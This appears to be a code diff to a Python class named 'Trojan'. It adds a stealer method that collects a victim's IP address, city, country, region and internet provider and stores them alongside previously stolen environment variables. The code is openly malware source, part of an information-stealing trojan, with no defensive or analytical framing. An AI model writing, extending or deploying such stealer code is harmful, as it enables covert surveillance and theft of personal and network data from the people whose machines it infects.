@@ -239,6 +239,26 @@ class Trojan:
         # Adding it.
         self.__stealed_information["Computer_EnvironmentVariables"] = variables
 
+    def stealer_grab_internet_information(self) -> None:
+        """
+        Steals all information about internet and location.
+        :return: [None] Not returns any.
+        """
+
+        # Getting information (IP, Address)
+        information = self.get_ip()
+
+        # Adding IP address.
+        self.__stealed_information["Internet_Address"] = information["ip"]
+
+        # Adding location.
+        self.__stealed_information["Internet_City"] = information["city"]
+        self.__stealed_information["Internet_Country"] = information["country"]
+        self.__stealed_information["Internet_Region"] = information["region"]
+
+        # Adding provider.
+        self.__stealed_information["Internet_Provider"] = information["org"]
+
     def stealer_grab_information(self) -> None:
         """
         Grabs all information about client.
